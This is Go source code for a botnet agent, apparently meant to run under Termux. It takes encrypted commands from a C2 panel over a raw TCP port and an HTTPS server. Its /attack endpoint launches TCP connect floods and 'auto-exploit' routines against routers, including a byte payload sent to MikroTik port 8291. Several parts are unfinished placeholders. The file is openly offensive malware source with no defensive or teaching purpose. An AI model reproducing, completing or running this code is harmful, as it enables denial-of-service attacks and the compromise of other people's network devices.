package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"strconv"
	"time"
)

// 🔑 Same key as in C2 panel (base64 decoded)
var encryptionKey = func() []byte {
	key, _ := base64.StdEncoding.DecodeString("TSs6IsAmPlCIGEUnuiIT5JAvY4xkD9gkRhdDBzrrLgI=")
	return key
}()

const MAGIC_BYTE = 0x42 // Magic byte (contoh, ubah sesuai kebutuhan)

// Placeholder fungsi yang harus diisi
func crc32Checksum(data []byte) uint32 {
	// TODO: Implementasi CRC32
	return 0
}
func decryptCommand(key []byte, data []byte) []byte {
	// TODO: Decrypt biner sesuai protokol
	return data
}
func execCommand(data []byte) {
	// TODO: Eksekusi perintah
	fmt.Println("[*] Executing command:", string(data))
}

// 🔓 Decryption function (AES-256 CFB)
func decrypt(ciphertext string) (string, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return "", err
	}

	decoded, err := base64.URLEncoding.DecodeString(ciphertext)
	if err != nil {
		return "", err
	}

	if len(decoded) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	iv := decoded[:aes.BlockSize]
	decoded = decoded[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(decoded, decoded)

	return string(decoded), nil
}

// 🛡️ Modified attack functions (tanpa raw socket)
func flood(target string, port int) {
	for {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 3*time.Second)
		if err == nil {
			conn.Close()
		}
		time.Sleep(time.Duration(rand.Intn(50)+10) * time.Millisecond)
	}
}

// ================== 🔥 Exploit Bagian Baru 🔥 ==================

var (
	exploitTargets = []string{
		"mikrotik",
		"huawei_hg532",
		"tp_link",
		"dlink",
	}

	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		"curl/7.68.0",
		"python-requests/2.26.0",
	}
)

func randomDelay(min, max int) {
	delay := rand.Intn(max-min) + min
	time.Sleep(time.Duration(delay) * time.Second)
}

func autoExploit(targetIP string) {
	randomDelay(5, 30)
	targetType := exploitTargets[rand.Intn(len(exploitTargets))]

	switch targetType {
	case "mikrotik":
		exploitMikroTik(targetIP)
	case "huawei_hg532":
		exploitHuawei(targetIP)
	}
}

func exploitMikroTik(ip string) {
	randomDelay(1, 5)
	conn, err := net.DialTimeout("tcp", ip+":8291", 10*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	payload := []byte{
		0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
	}
	conn.SetDeadline(time.Now().Add(15 * time.Second))
	conn.Write(payload)
	randomDelay(2, 10)
}

func exploitHuawei(ip string) {
	// Implementasi exploit Huawei HG532 (placeholder)
}

// ===============================================================
// 🔄 Binary server handler

func startBinaryServer() {
	ln, _ := net.Listen("tcp", ":31337")
	defer ln.Close()

	for {
		conn, _ := ln.Accept()
		go handleBinaryConnection(conn)
	}
}

func handleBinaryConnection(conn net.Conn) {
	defer conn.Close()

	header := make([]byte, 7)
	conn.Read(header)

	if header[0] != MAGIC_BYTE {
		return
	}

	checksum := binary.BigEndian.Uint32(header[1:5])
	length := binary.BigEndian.Uint16(header[5:7])
	data := make([]byte, length)
	conn.Read(data)

	if crc32Checksum(data) != checksum {
		return
	}

	decrypted := decryptCommand(encryptionKey, data)
	execCommand(decrypted)
}

// ===============================================================
// 🔄 HTTP handlers

func handleAttack(w http.ResponseWriter, r *http.Request) {
	encTarget := r.URL.Query().Get("target")
	encPort := r.URL.Query().Get("port")

	target, err := decrypt(encTarget)
	if err != nil {
		http.Error(w, "[!] Invalid target parameter", http.StatusBadRequest)
		return
	}

	portStr, err := decrypt(encPort)
	if err != nil {
		http.Error(w, "[!] Invalid port parameter", http.StatusBadRequest)
		return
	}

	port, err := strconv.Atoi(portStr)
	if err != nil {
		http.Error(w, "[!] Invalid port number", http.StatusBadRequest)
		return
	}

	for i := 0; i < 3; i++ {
		go flood(target, port)
		go autoExploit(target)
	}

	fmt.Fprintf(w, "[✓] Attack launched & exploit triggered against %s:%d", target, port)
}

func handlePing(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, "pong")
}

func handleShutdown(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("[✓] Shutdown initiated"))
	go func() {
		time.Sleep(1 * time.Second)
		log.Fatal("Bot shutting down...")
	}()
}

// ===============================================================
// 🔁 Server restart otomatis

func startServer() {
	for {
		cert, _ := tls.LoadX509KeyPair("ZMBR.crt", "ZMBR.key")
		server := &http.Server{
			Addr: ":8443",
			TLSConfig: &tls.Config{
				Certificates: []tls.Certificate{cert},
			},
		}

		err := server.ListenAndServeTLS("", "")
		if err != nil {
			log.Printf("Restarting server... (%v)", err)
			time.Sleep(2 * time.Second)
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	// 🔄 Start binary server
	go startBinaryServer()

	// 🔄 Start auto-restart HTTPS server
	go startServer()

	cert, err := tls.LoadX509KeyPair(
		"/data/data/com.termux/files/home/ssl/ZMBR.crt",
		"/data/data/com.termux/files/home/ssl/ZMBR.key",
	)
	if err != nil {
		log.Fatalf("Failed to load TLS cert: %v", err)
	}

	server := &http.Server{
		Addr: ":8443",
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{cert},
		},
	}

	http.HandleFunc("/attack", handleAttack)
	http.HandleFunc("/ping", handlePing)
	http.HandleFunc("/shutdown", handleShutdown)

	fmt.Println("🔐 Encrypted bot online (HTTPS) - Port 8443 - Waiting for C2 commands...")
	log.Fatal(server.ListenAndServeTLS(
		"/data/data/com.termux/files/home/ssl/ZMBR.crt",
		"/data/data/com.termux/files/home/ssl/ZMBR.key",
	))
}
